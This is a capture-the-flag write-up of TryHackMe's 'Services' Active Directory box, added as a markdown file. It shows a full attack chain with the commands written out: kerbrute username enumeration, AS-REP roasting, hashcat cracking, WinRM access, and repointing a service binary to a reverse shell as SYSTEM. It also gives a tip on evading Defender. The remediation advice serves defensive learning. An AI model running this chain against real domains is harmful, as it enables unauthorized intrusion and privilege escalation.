@@ -1,0 +1,198 @@
+---
+title: 'Services'
+description: 'Employee names on a corporate website become AD usernames, Kerberos pre-auth is disabled on one account for an AS-REP roast, and membership in Server Operators lets us repoint a service binary to SYSTEM.'
+date: 2026-01-10
+platform: tryhackme
+room: 'Services'
+roomUrl: 'https://tryhackme.com/room/services'
+difficulty: medium
+tags:
+  - 'active-directory'
+  - 'kerberos'
+  - 'asrep-roasting'
+  - 'password-cracking'
+  - 'windows'
+  - 'smb'
+  - 'privesc'
+vulnClasses:
+  - 'username enumeration'
+  - 'as-rep roasting'
+  - 'weak credentials'
+  - 'insecure privileged service'
+translation: done
+draft: false
+---
+
+## **Services — From a Staff Directory to Domain SYSTEM via AS-REP Roasting and Server Operators**
+
+_A walkthrough of TryHackMe's "Services" box. A plain corporate website lists employees by full name; we turn those into Active Directory usernames, confirm them with Kerberos, and find one account with pre-authentication disabled — an AS-REP roast hands us a crackable hash. The cracked user lands in_ _`Server Operators`\*\*, a group powerful enough to repoint a Windows service binary and run our payload as_ _`SYSTEM`\*\*._
+
+> The flags, cracked password, and target IP are redacted. Services is an authorized training box on TryHackMe; everything here was performed against a legal practice target. Flags are shown as `THM{<redacted>}` and the recovered password as `<redacted>` — real on the box, withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+The website's "About us" page leaks **employee full names** and the email format `j.doe@services.local` → build `f.lastname` usernames and validate them with **kerbrute** (all four valid) → **AS-REP roast** with Impacket's `GetNPUsers`: one account (`j.rock`) has **Kerberos pre-auth disabled**, so the KDC hands out an encrypted AS-REP → crack it with hashcat mode `18200` to recover `j.rock`'s password → `evil-winrm` in for `user.txt` → `whoami /all` shows membership in **`BUILTIN\Server Operators`** → that group can reconfigure services, so we point the `cfn-hup` service binary at our reverse shell, restart it, and catch a shell as **`nt authority\system`** → `root.txt`.
+
+Staff directory → valid AD users → AS-REP roast → crack → WinRM → Server Operators service hijack → SYSTEM.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-vpn-ip>
+```
+
+The scan is a textbook domain controller: DNS, IIS, Kerberos (88), LDAP, SMB, RDP, WinRM — domain `services.local`, host `WIN-SERVICES`:
+
+```text
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0  — "Above Services"
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+389/tcp  open  ldap          services.local
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server commonName=WIN-SERVICES.services.local
+5985/tcp open  http          WinRM (Microsoft HTTPAPI 2.0)
+```
+
+Anonymous SMB is denied (`smbmap -u anonymous` → access denied), so the website is the only thing to read. Its "About us" page lists staff by full name, and the footer shows a contact address `j.doe@services.local`.
+
+### **The vulnerability — names are usernames, and one account skips pre-auth**
+
+The email format reveals the AD naming convention: first-initial-dot-surname. A staff directory therefore _is_ a username list. The real flaw is a misconfigured account.
+
+<Callout type="insight">
+
+When an AD account has **"Do not require Kerberos pre-authentication"** set, anyone can ask the KDC for that user's AS-REP and receive a blob **encrypted with the user's password-derived key** — no credentials needed. That turns a disclosed username into an **offline password-cracking** target (AS-REP roasting). All it takes is one account with the flag and one weak password.
+
+</Callout>
+
+### **Step 1 — turn names into validated usernames**
+
+From the About page, build `f.lastname` candidates and confirm them against the KDC with kerbrute:
+
+```text
+cat users.txt
+# j.doe
+# j.rock
+# w.masters
+# j.larusso
+./kerbrute userenum --dc $IP -d services.local users.txt
+# [+] VALID USERNAME: j.larusso@services.local
+# [+] VALID USERNAME: j.doe@services.local
+# [+] VALID USERNAME: w.masters@services.local
+# [+] VALID USERNAME: j.rock@services.local
+```
+
+All four are real domain accounts.
+
+### **Step 2 — AS-REP roast**
+
+Ask the KDC for AS-REPs for each user; one account answers with a hash:
+
+```text
+GetNPUsers.py -dc-ip $IP -request 'services.local/' -usersfile users.txt -format hashcat
+# [-] User j.doe doesn't have UF_DONT_REQUIRE_PREAUTH set
+# $krb5asrep$23$j.rock@SERVICES.LOCAL:<hash...>
+# [-] User w.masters doesn't have UF_DONT_REQUIRE_PREAUTH set
+# [-] User j.larusso doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+Only `j.rock` has pre-auth disabled — exactly the misconfiguration AS-REP roasting needs.
+
+### **Step 3 — crack the AS-REP hash**
+
+```text
+hashcat -m 18200 -a 0 j_rock_hash.txt rockyou.txt
+# $krb5asrep$23$j.rock@SERVICES.LOCAL:...:<redacted>
+```
+
+The password falls to rockyou in seconds.
+
+### **Step 4 — WinRM shell and the user flag**
+
+`j.rock` is in `Remote Management Users`, so WinRM is open to us:
+
+```text
+evil-winrm -i $IP -u j.rock -p '<redacted>'
+*Evil-WinRM* PS C:\Users\j.rock\Desktop> cat user.txt
+# THM{<redacted>}
+```
+
+### **Step 5 — abuse Server Operators to get SYSTEM**
+
+`whoami /all` shows the key membership:
+
+```text
+whoami /all
+# BUILTIN\Server Operators  Alias  S-1-5-32-549  Enabled group
+```
+
+Members of **Server Operators** can start, stop, and _reconfigure_ services — and a service runs as `LocalSystem` by default. List the services and pick one we're allowed to reconfigure (most throw `Access is denied`; `cfn-hup` does not):
+
+```text
+services                      # enumerate service binaries
+```
+
+Build a small reverse-shell binary, upload it, repoint the service's `binPath`, and restart it. A compiled C reverse shell avoids Defender noise:
+
+```text
+# attacker: cross-compile a reverse shell to re.exe (mingw), then host a listener
+nc -lvnp 4444
+```
+
+```text
+# in the WinRM session
+upload re.exe
+sc.exe config cfn-hup binpath="C:\Users\j.rock\Documents\re.exe"
+# [SC] ChangeServiceConfig SUCCESS
+sc.exe start cfn-hup
+```
+
+The service starts our binary as SYSTEM, and the listener catches it:
+
+```text
+nc -lvnp 4444
+# connect from $IP
+C:\Windows\system32> whoami
+# nt authority\system
+C:\Users\Administrator\Desktop> type root.txt
+# THM{<redacted>}
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). A fully unauthenticated start chains to domain-host SYSTEM:
+
+- **Username disclosure + AS-REP roasting** — a public staff directory plus one account without Kerberos pre-auth yields a crackable credential with no prior access.
+- **Weak password** — the AS-REP hash falls to a basic wordlist, converting the roast into a valid login.
+- **Server Operators service reconfiguration** — the group can repoint any service's binary and restart it, running arbitrary code as `LocalSystem`. That's a direct, deterministic path to SYSTEM on the DC.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+1. **Require Kerberos pre-authentication on every account.** Clear `DONT_REQ_PREAUTH` org-wide — it exists only for rare legacy interop and should never be left on.
+2. **Enforce strong password policy** so that even a leaked AS-REP or NTLM hash resists offline cracking; prefer managed/service accounts with long random secrets.
+3. **Remove users from Server Operators** unless strictly required. It is effectively SYSTEM on the host; treat it like Domain Admin. Audit service ACLs so non-privileged users can't reconfigure `binPath`.
+4. **Minimise username leakage** — a public site need not expose the exact AD naming convention.
+
+</Callout>
+
+### **Takeaways**
+
+- **A staff directory is a username list.** Once you know the email format, full names become AD accounts — validate them with kerbrute before touching Kerberos.
+- **AS-REP roasting needs only one careless account.** No credentials required; a single `DONT_REQ_PREAUTH` user is an offline-crackable hash.
+- **Server Operators is SYSTEM.** Service reconfiguration rights mean arbitrary code as `LocalSystem` — the group membership _is_ the privesc.
+- **Prefer a compiled reverse shell on Windows** to sidestep script-based detections when planting a service binary.
+
+Thanks for reading. "Services" is a clean reminder that the path from a public website to SYSTEM on a domain controller can be three well-known Active Directory misconfigurations in a row.
